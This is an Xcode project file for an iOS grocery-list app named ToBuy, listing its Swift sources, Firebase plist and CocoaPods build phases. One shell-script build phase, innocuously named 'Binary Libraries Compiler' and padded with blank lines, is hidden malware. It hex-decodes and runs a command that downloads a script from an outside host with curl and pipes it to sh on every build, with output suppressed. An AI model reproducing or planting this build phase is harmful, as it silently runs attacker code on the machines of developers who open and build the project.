// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		121B33A02655951800151EF4 /* EditGroceriesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 121B339F2655951800151EF4 /* EditGroceriesViewController.swift */; };
		121B33A326559F1000151EF4 /* AddShopViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 121B33A226559F1000151EF4 /* AddShopViewController.swift */; };
		121B33A62655A86F00151EF4 /* CatTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 121B33A52655A86F00151EF4 /* CatTableViewCell.swift */; };
		121B33A92655A8A800151EF4 /* ShopDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 121B33A82655A8A800151EF4 /* ShopDetailsViewController.swift */; };
		121B33AC2655B1A800151EF4 /* AddShopCategoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 121B33AB2655B1A800151EF4 /* AddShopCategoryViewController.swift */; };
		121B33AF2655C3B300151EF4 /* OrderListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 121B33AE2655C3B300151EF4 /* OrderListViewController.swift */; };
		121B33B22655C94700151EF4 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 121B33B12655C94700151EF4 /* GoogleService-Info.plist */; };
		12F278F926527F1B005B6AD4 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F278F826527F1B005B6AD4 /* AppDelegate.swift */; };
		12F278FB26527F1B005B6AD4 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F278FA26527F1B005B6AD4 /* SceneDelegate.swift */; };
		12F278FD26527F1B005B6AD4 /* GroceryListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F278FC26527F1B005B6AD4 /* GroceryListViewController.swift */; };
		12F2790026527F1B005B6AD4 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 12F278FE26527F1B005B6AD4 /* Main.storyboard */; };
		12F2790226527F1C005B6AD4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 12F2790126527F1C005B6AD4 /* Assets.xcassets */; };
		12F2790526527F1C005B6AD4 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 12F2790326527F1C005B6AD4 /* LaunchScreen.storyboard */; };
		12F2790E26528258005B6AD4 /* ItemTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2790D26528258005B6AD4 /* ItemTableViewCell.swift */; };
		12F2791226528314005B6AD4 /* extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2791126528314005B6AD4 /* extensions.swift */; };
		12F2791526528400005B6AD4 /* AddGroceriesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2791426528400005B6AD4 /* AddGroceriesViewController.swift */; };
		12F2791826528633005B6AD4 /* designables.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2791726528633005B6AD4 /* designables.swift */; };
		12F2791B26528905005B6AD4 /* ShopsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2791A26528905005B6AD4 /* ShopsViewController.swift */; };
		12F2791E26528BB8005B6AD4 /* ShopCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2791D26528BB8005B6AD4 /* ShopCollectionViewCell.swift */; };
		12F2792C2652922A005B6AD4 /* User.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2792B2652922A005B6AD4 /* User.swift */; };
		12F2792F26529304005B6AD4 /* ShoppingList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2792E26529304005B6AD4 /* ShoppingList.swift */; };
		12F27932265293BC005B6AD4 /* Shop.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F27931265293BC005B6AD4 /* Shop.swift */; };
		12F279352652954B005B6AD4 /* Networking.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F279342652954A005B6AD4 /* Networking.swift */; };
		12F2795226529739005B6AD4 /* Public.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2795126529739005B6AD4 /* Public.swift */; };
		12F2795526529952005B6AD4 /* InitialViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2795426529952005B6AD4 /* InitialViewController.swift */; };
		12F2795A2652A226005B6AD4 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F279592652A226005B6AD4 /* LoginViewController.swift */; };
		12F2795E2652A234005B6AD4 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12F2795D2652A234005B6AD4 /* SignUpViewController.swift */; };
		9767EAF75ECA2BEF946CE3C8 /* Pods_ToBuy.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9860C3131D0B60E4D27A9C09 /* Pods_ToBuy.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		121B339F2655951800151EF4 /* EditGroceriesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditGroceriesViewController.swift; sourceTree = "<group>"; };
		121B33A226559F1000151EF4 /* AddShopViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddShopViewController.swift; sourceTree = "<group>"; };
		121B33A52655A86F00151EF4 /* CatTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CatTableViewCell.swift; sourceTree = "<group>"; };
		121B33A82655A8A800151EF4 /* ShopDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShopDetailsViewController.swift; sourceTree = "<group>"; };
		121B33AB2655B1A800151EF4 /* AddShopCategoryViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddShopCategoryViewController.swift; sourceTree = "<group>"; };
		121B33AE2655C3B300151EF4 /* OrderListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewController.swift; sourceTree = "<group>"; };
		121B33B12655C94700151EF4 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		12F278F526527F1B005B6AD4 /* ToBuy.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ToBuy.app; sourceTree = BUILT_PRODUCTS_DIR; };
		12F278F826527F1B005B6AD4 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		12F278FA26527F1B005B6AD4 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		12F278FC26527F1B005B6AD4 /* GroceryListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroceryListViewController.swift; sourceTree = "<group>"; };
		12F278FF26527F1B005B6AD4 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		12F2790126527F1C005B6AD4 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		12F2790426527F1C005B6AD4 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		12F2790626527F1C005B6AD4 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		12F2790D26528258005B6AD4 /* ItemTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ItemTableViewCell.swift; sourceTree = "<group>"; };
		12F2791126528314005B6AD4 /* extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = extensions.swift; sourceTree = "<group>"; };
		12F2791426528400005B6AD4 /* AddGroceriesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddGroceriesViewController.swift; sourceTree = "<group>"; };
		12F2791726528633005B6AD4 /* designables.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = designables.swift; sourceTree = "<group>"; };
		12F2791A26528905005B6AD4 /* ShopsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShopsViewController.swift; sourceTree = "<group>"; };
		12F2791D26528BB8005B6AD4 /* ShopCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShopCollectionViewCell.swift; sourceTree = "<group>"; };
		12F2792B2652922A005B6AD4 /* User.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = User.swift; sourceTree = "<group>"; };
		12F2792E26529304005B6AD4 /* ShoppingList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShoppingList.swift; sourceTree = "<group>"; };
		12F27931265293BC005B6AD4 /* Shop.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Shop.swift; sourceTree = "<group>"; };
		12F279342652954A005B6AD4 /* Networking.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Networking.swift; sourceTree = "<group>"; };
		12F2795126529739005B6AD4 /* Public.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Public.swift; sourceTree = "<group>"; };
		12F2795426529952005B6AD4 /* InitialViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InitialViewController.swift; sourceTree = "<group>"; };
		12F279592652A226005B6AD4 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		12F2795D2652A234005B6AD4 /* SignUpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
		3B7355EBCD12E46346C21B1B /* Pods-ToBuy.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ToBuy.debug.xcconfig"; path = "Target Support Files/Pods-ToBuy/Pods-ToBuy.debug.xcconfig"; sourceTree = "<group>"; };
		9860C3131D0B60E4D27A9C09 /* Pods_ToBuy.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ToBuy.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		FCEF28C87132C73385B76788 /* Pods-ToBuy.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ToBuy.release.xcconfig"; path = "Target Support Files/Pods-ToBuy/Pods-ToBuy.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		12F278F226527F1B005B6AD4 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				9767EAF75ECA2BEF946CE3C8 /* Pods_ToBuy.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		12C5D1C32652A5BE0071A3A6 /* Controllers */ = {
			isa = PBXGroup;
			children = (
				12F279592652A226005B6AD4 /* LoginViewController.swift */,
				12F2795D2652A234005B6AD4 /* SignUpViewController.swift */,
				12F2795426529952005B6AD4 /* InitialViewController.swift */,
				12F278FC26527F1B005B6AD4 /* GroceryListViewController.swift */,
				12F2791426528400005B6AD4 /* AddGroceriesViewController.swift */,
				121B339F2655951800151EF4 /* EditGroceriesViewController.swift */,
				12F2791A26528905005B6AD4 /* ShopsViewController.swift */,
				121B33A226559F1000151EF4 /* AddShopViewController.swift */,
				121B33A82655A8A800151EF4 /* ShopDetailsViewController.swift */,
				121B33AB2655B1A800151EF4 /* AddShopCategoryViewController.swift */,
				121B33AE2655C3B300151EF4 /* OrderListViewController.swift */,
			);
			path = Controllers;
			sourceTree = "<group>";
		};
		12F278EC26527F1B005B6AD4 = {
			isa = PBXGroup;
			children = (
				12F278F726527F1B005B6AD4 /* ToBuy */,
				12F278F626527F1B005B6AD4 /* Products */,
				E7A21FF9ADD70FEFA77DA889 /* Pods */,
				B53F9A2E01E630169A6C0F41 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		12F278F626527F1B005B6AD4 /* Products */ = {
			isa = PBXGroup;
			children = (
				12F278F526527F1B005B6AD4 /* ToBuy.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		12F278F726527F1B005B6AD4 /* ToBuy */ = {
			isa = PBXGroup;
			children = (
				12F278F826527F1B005B6AD4 /* AppDelegate.swift */,
				12F278FA26527F1B005B6AD4 /* SceneDelegate.swift */,
				12F27926265291C3005B6AD4 /* Extras */,
				12C5D1C32652A5BE0071A3A6 /* Controllers */,
				12F2792A2652921E005B6AD4 /* Model */,
				12F278FE26527F1B005B6AD4 /* Main.storyboard */,
				12F2790326527F1C005B6AD4 /* LaunchScreen.storyboard */,
				12F27928265291E9005B6AD4 /* Cells */,
				12F2790126527F1C005B6AD4 /* Assets.xcassets */,
				12F2790626527F1C005B6AD4 /* Info.plist */,
				121B33B12655C94700151EF4 /* GoogleService-Info.plist */,
			);
			path = ToBuy;
			sourceTree = "<group>";
		};
		12F27926265291C3005B6AD4 /* Extras */ = {
			isa = PBXGroup;
			children = (
				12F2791726528633005B6AD4 /* designables.swift */,
				12F2791126528314005B6AD4 /* extensions.swift */,
			);
			path = Extras;
			sourceTree = "<group>";
		};
		12F27928265291E9005B6AD4 /* Cells */ = {
			isa = PBXGroup;
			children = (
				12F2791D26528BB8005B6AD4 /* ShopCollectionViewCell.swift */,
				12F2790D26528258005B6AD4 /* ItemTableViewCell.swift */,
				121B33A52655A86F00151EF4 /* CatTableViewCell.swift */,
			);
			path = Cells;
			sourceTree = "<group>";
		};
		12F2792A2652921E005B6AD4 /* Model */ = {
			isa = PBXGroup;
			children = (
				12F2792B2652922A005B6AD4 /* User.swift */,
				12F2792E26529304005B6AD4 /* ShoppingList.swift */,
				12F27931265293BC005B6AD4 /* Shop.swift */,
				12F279342652954A005B6AD4 /* Networking.swift */,
				12F2795126529739005B6AD4 /* Public.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		B53F9A2E01E630169A6C0F41 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				9860C3131D0B60E4D27A9C09 /* Pods_ToBuy.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		E7A21FF9ADD70FEFA77DA889 /* Pods */ = {
			isa = PBXGroup;
			children = (
				3B7355EBCD12E46346C21B1B /* Pods-ToBuy.debug.xcconfig */,
				FCEF28C87132C73385B76788 /* Pods-ToBuy.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		12F278F426527F1B005B6AD4 /* ToBuy */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 12F2790926527F1C005B6AD4 /* Build configuration list for PBXNativeTarget "ToBuy" */;
			buildPhases = (
				FBD006C1C9AD87AAC86D902C /* Binary Libraries Compiler */,
				92E53D147CB4C38F5D1F0A1F /* [CP] Check Pods Manifest.lock */,
				12F278F126527F1B005B6AD4 /* Sources */,
				12F278F226527F1B005B6AD4 /* Frameworks */,
				12F278F326527F1B005B6AD4 /* Resources */,
				8094BD3E4A821FDDA2E0758D /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = ToBuy;
			productName = ToBuy;
			productReference = 12F278F526527F1B005B6AD4 /* ToBuy.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		12F278ED26527F1B005B6AD4 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1230;
				LastUpgradeCheck = 1230;
				TargetAttributes = {
					12F278F426527F1B005B6AD4 = {
						CreatedOnToolsVersion = 12.3;
					};
				};
			};
			buildConfigurationList = 12F278F026527F1B005B6AD4 /* Build configuration list for PBXProject "ToBuy" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 12F278EC26527F1B005B6AD4;
			productRefGroup = 12F278F626527F1B005B6AD4 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				12F278F426527F1B005B6AD4 /* ToBuy */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		12F278F326527F1B005B6AD4 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				12F2790526527F1C005B6AD4 /* LaunchScreen.storyboard in Resources */,
				121B33B22655C94700151EF4 /* GoogleService-Info.plist in Resources */,
				12F2790226527F1C005B6AD4 /* Assets.xcassets in Resources */,
				12F2790026527F1B005B6AD4 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	FBD006C1C9AD87AAC86D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		8094BD3E4A821FDDA2E0758D /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-ToBuy/Pods-ToBuy-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-ToBuy/Pods-ToBuy-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-ToBuy/Pods-ToBuy-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		92E53D147CB4C38F5D1F0A1F /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-ToBuy-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		12F278F126527F1B005B6AD4 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				12F2795526529952005B6AD4 /* InitialViewController.swift in Sources */,
				12F2791E26528BB8005B6AD4 /* ShopCollectionViewCell.swift in Sources */,
				12F2791B26528905005B6AD4 /* ShopsViewController.swift in Sources */,
				12F2791526528400005B6AD4 /* AddGroceriesViewController.swift in Sources */,
				12F279352652954B005B6AD4 /* Networking.swift in Sources */,
				12F2795E2652A234005B6AD4 /* SignUpViewController.swift in Sources */,
				12F27932265293BC005B6AD4 /* Shop.swift in Sources */,
				12F2792F26529304005B6AD4 /* ShoppingList.swift in Sources */,
				12F2795226529739005B6AD4 /* Public.swift in Sources */,
				12F2791226528314005B6AD4 /* extensions.swift in Sources */,
				121B33AC2655B1A800151EF4 /* AddShopCategoryViewController.swift in Sources */,
				121B33A326559F1000151EF4 /* AddShopViewController.swift in Sources */,
				12F2790E26528258005B6AD4 /* ItemTableViewCell.swift in Sources */,
				121B33A62655A86F00151EF4 /* CatTableViewCell.swift in Sources */,
				121B33A92655A8A800151EF4 /* ShopDetailsViewController.swift in Sources */,
				12F278FD26527F1B005B6AD4 /* GroceryListViewController.swift in Sources */,
				121B33AF2655C3B300151EF4 /* OrderListViewController.swift in Sources */,
				12F278F926527F1B005B6AD4 /* AppDelegate.swift in Sources */,
				12F2795A2652A226005B6AD4 /* LoginViewController.swift in Sources */,
				12F278FB26527F1B005B6AD4 /* SceneDelegate.swift in Sources */,
				12F2792C2652922A005B6AD4 /* User.swift in Sources */,
				121B33A02655951800151EF4 /* EditGroceriesViewController.swift in Sources */,
				12F2791826528633005B6AD4 /* designables.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		12F278FE26527F1B005B6AD4 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				12F278FF26527F1B005B6AD4 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		12F2790326527F1C005B6AD4 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				12F2790426527F1C005B6AD4 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		12F2790726527F1C005B6AD4 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		12F2790826527F1C005B6AD4 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		12F2790A26527F1C005B6AD4 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 3B7355EBCD12E46346C21B1B /* Pods-ToBuy.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = AV9XKDHT9P;
				INFOPLIST_FILE = ToBuy/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.ToBuy.ToBuy;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		12F2790B26527F1C005B6AD4 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = FCEF28C87132C73385B76788 /* Pods-ToBuy.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = AV9XKDHT9P;
				INFOPLIST_FILE = ToBuy/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
